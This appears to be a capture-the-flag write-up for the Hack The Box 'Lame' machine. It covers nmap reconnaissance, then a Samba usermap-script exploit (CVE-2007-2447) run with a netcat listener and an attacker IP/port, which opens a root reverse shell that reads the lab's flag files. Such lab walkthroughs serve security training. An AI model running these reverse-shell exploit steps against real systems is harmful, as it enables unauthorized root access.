# Lame Write-Up

![Lame Overview](./lame-overview.png)

Lame is a very basic machine from the [Beginner Track](https://app.hackthebox.com/tracks/Beginner-Track) track to start getting familiar with the main tools of pentesting.

### nmap

nmap finds four open TCP ports, FTP (21), SSH (22), old SMB (139), SMB (445):

```bash
nmap -p- --open --min-rate=5000 -Pn -T4 -oN nmap/open_ports 10.129.143.253
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-06 20:05 CET
Nmap scan report for 10.129.143.253
Host is up (0.048s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
```

```bash
nmap -p 21,22,139,445 -sV -sC -oN nmap/services_version 10.129.143.253
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-06 20:16 CET

Host is up (0.046s latency).

### SMB

Looing the samba version I found [this](https://github.com/amriunix/CVE-2007-2447). So following the Python script I did the following.

- Open my netcat and type:

```bash
nc -lvnp 1234
```

- Execute GitHub exploit to get the root shell:

```bash
python3 usermap_script.py 10.129.143.253 139 10.10.14.129 1234
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```

- Got shell:

```
nc -lvnp 1234
Connection from 10.129.143.253:41195
whoami
root
```

- Get the normal user and root flags:

```
ls home
ftp
makis
service
user
cd /home/makis
ls
user.txt
cat user.txt
f7da385424028604c99dd9ff8bb5a6b3
f7dXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
cd /root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
618XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

And the machine is pwned! ;)
